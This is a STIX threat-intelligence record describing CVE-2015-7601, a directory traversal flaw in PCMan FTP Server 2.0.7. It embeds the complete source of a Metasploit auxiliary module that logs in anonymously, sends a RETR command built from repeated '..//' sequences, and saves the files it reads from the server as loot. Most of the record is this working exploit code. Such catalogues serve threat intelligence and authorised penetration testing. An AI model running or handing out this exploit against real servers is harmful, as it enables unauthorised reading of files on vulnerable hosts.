{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--af045daa-0785-410d-a8a7-8ff95879d310",
    "created": "2024-08-14T16:28:13.440955Z",
    "modified": "2024-08-14T16:28:13.44096Z",
    "name": "PCMan FTP Server 2.0.7 Directory Traversal Information Disclosure",
    "description": " This module exploits a directory traversal vulnerability found in PCMan FTP Server 2.0.7. This vulnerability allows an attacker to download arbitrary files from the server by crafting a RETR command that includes file system traversal strings such as '..//'  'Platform'       => 'win'",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/ftp/pcman_ftp_traversal.rb",
            "external_id": "pcman_ftp_traversal.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-7601"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Ftp\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'PCMan FTP Server 2.0.7 Directory Traversal Information Disclosure',\n      'Description'    => %q{\n        This module exploits a directory traversal vulnerability found in PCMan FTP Server 2.0.7.\n        This vulnerability allows an attacker to download arbitrary files from the server by crafting\n        a RETR command that includes file system traversal strings such as '..//'\n      },\n      'Platform'       => 'win',\n      'Author'         =>\n        [\n          'Jay Turla',   # @shipcod3, msf and initial discovery\n          'James Fitts', # initial discovery\n          'Brad Wolfe <brad.wolfe[at]gmail.com>'\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'EDB', '38340'],\n          [ 'CVE', '2015-7601']\n        ],\n      'DisclosureDate' => '2015-09-28'\n    ))\n\n    register_options(\n      [\n        OptInt.new('DEPTH', [ true, 'Traversal Depth (to reach the root folder)', 32 ]),\n        OptString.new('PATH', [ true, \"Path to the file to disclose, relative to the root dir.\", 'boot.ini'])\n      ])\n  end\n\n  def check_host(ip)\n    begin\n      connect\n      if /220 PCMan's FTP Server 2\\.0/i === banner\n        return Exploit::CheckCode::Appears\n      end\n    ensure\n      disconnect\n    end\n\n    Exploit::CheckCode::Safe\n  end\n\n  def run_host(target_host)\n    begin\n      # Login anonymously and open the socket that we'll use for data retrieval.\n      connect_login\n      sock = data_connect\n      if sock.nil?\n        error_msg = __FILE__ <<'::'<< __method__.to_s << ':' << 'data_connect failed; posssible invalid response'\n        print_status(error_msg)\n        elog(error_msg)\n      else\n        file_path = datastore['PATH']\n        file = ::File.basename(file_path)\n\n        # make RETR request and store server response message...\n        retr_cmd = ( \"..//\" * datastore['DEPTH'] ) + \"#{file_path}\"\n        res = send_cmd( [\"RETR\", retr_cmd])\n\n        # read the file data from the socket that we opened\n        # dont assume theres still a sock to read from. Per #7582\n        if sock.nil?\n          error_msg = __FILE__ <<'::'<< __method__.to_s << ':' << 'data_connect failed; posssible invalid response'\n          print_status(error_msg)\n          elog(error_msg)\n          return\n        else\n          # read the file data from the socket that we opened\n          response_data = sock.read(1024)\n        end\n\n        unless response_data\n          print_error(\"#{file_path} not found\")\n          return\n        end\n\n        if response_data.length == 0 or ! (res =~ /^150/ )\n          print_status(\"File (#{file_path})from #{peer} is empty...\")\n          return\n        end\n\n        # store file data to loot\n        loot_file = store_loot(\"pcman.ftp.data\", \"text\", rhost, response_data, file, file_path)\n        vprint_status(\"Data returned:\\n\")\n        vprint_line(response_data)\n        print_good(\"Stored #{file_path} to #{loot_file}\")\n      end\n\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout => e\n      vprint_error(e.message)\n      elog(e)\n    rescue ::Timeout::Error, ::Errno::EPIPE => e\n      vprint_error(e.message)\n      elog(e)\n    ensure\n      data_disconnect\n      disconnect\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-09-28"
}